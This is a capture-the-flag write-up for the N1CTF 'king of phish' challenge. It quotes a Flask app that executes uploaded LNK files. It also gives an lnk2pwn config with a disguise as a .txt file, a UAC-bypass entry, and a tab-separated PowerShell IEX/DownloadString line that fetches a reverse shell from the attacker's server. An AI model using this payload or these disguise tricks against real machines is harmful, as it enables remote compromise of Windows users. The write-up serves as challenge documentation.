# The king of phish (Victim bot)
We are given the following code
```python
import os
import uuid
import LnkParse3 as Lnk
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    source = open(__file__, 'r').read().replace("\n", "\x3c\x62\x72\x3e").replace(" ", "\x26\x6e\x62\x73\x70\x3b")
    return source


@app.route('/send', methods=['POST'])
def sendFile():
    if 'file' not in request.files:
        return 'No file part'
    file = request.files['file']

    if file.filename == '':
        return 'No selected file'
    data = file.stream.read()
    if not data.startswith(b"\x4c\x00"):
        return "You're a bad guy!"
    shortcut = Lnk.lnk_file(indata=data)
    if shortcut.data['command_line_arguments'].count(" "):
        return "File is killed by antivirus."
    filename = str(uuid.uuid4())+".lnk"
    fullname = os.path.join(os.path.abspath(os.curdir) + "/uploads", filename)
    open(fullname, "wb").write(data)
    clickLnk(fullname)
    return "Clicked."


def clickLnk(lnkPath):
    os.system('cmd /c "%s"' % lnkPath)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
We can upload a LNK file which will be executed. The only limitation is the use of spaces in the command arguments, which we can bypass by using tab characters instead. To generate the payload we can use [lnk2pwn](https://github.com/tommelo/lnk2pwn) with the following config.json
```json
{
    "shortcut": {
        "target_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
        "working_dir": "C:\\Users\\usera\\Desktop",
        "arguments": "IEX(New-Object\tNet.WebClient).DownloadString('http://[OUR SERVER]/reverse_shell.ps1')",
        "icon_path": "C:\\Windows\\System32\\notepad.exe",
        "icon_index": null,
        "window_style": "MINIMIZED",
        "description": "a",
        "fake_extension": ".txt",
        "file_name_prefix": "b"
    },
    "elevated_uac": {
        "file_name": "uac_bypass.vbs",
        "cmd": "cmd.exe"
    }
}
```
Uploading this gives us a shell and we can get the flag from `C:\Users\usera\Desktop\flag.txt`.
The flag is `n1ctf{I'm_a_little_fish,_swimming_in_the_ocean}`
